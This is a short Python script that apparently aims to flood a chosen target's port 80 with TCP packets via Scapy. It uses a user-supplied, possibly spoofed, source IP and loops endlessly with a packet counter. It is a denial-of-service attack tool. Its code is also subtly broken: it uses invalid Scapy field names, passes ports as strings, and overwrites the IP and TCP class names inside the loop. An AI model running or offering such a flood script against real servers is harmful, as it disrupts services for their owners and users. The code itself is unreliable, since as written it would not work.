from scapy.all import *

source_ip   = input("Introduce your source IP")
target_ip   = input("Introduce your target IP")
source_port = input("Introduce your source port")
i = 1

while True:
    IP = IP(source_IP=source_ip, target_IP=target_ip)
    TCP = TCP(srcport=source_port, dstport=80)
    pkt = IP / TCP
    send(pkt, inter= .001)

    print("Pkt send", i)

    i = i + 1